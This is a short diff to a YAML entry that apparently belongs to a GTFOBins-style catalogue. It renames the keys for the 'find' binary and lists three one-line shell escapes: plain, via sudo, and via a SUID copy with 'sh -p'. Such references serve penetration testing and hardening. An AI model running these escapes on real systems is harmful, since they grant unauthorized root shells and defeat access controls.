@@ -1,9 +1,9 @@
 ---
 functions:
-  exec-interactive:
+  shell:
     - code: find . -exec /bin/sh \; -quit
-  sudo-enabled:
-    - code: sudo find . -exec /bin/sh \; -quit
-  suid-enabled:
+  suid:
     - code: ./find . -exec /bin/sh -p \; -quit
+  sudo:
+    - code: sudo find . -exec /bin/sh \; -quit
 ---
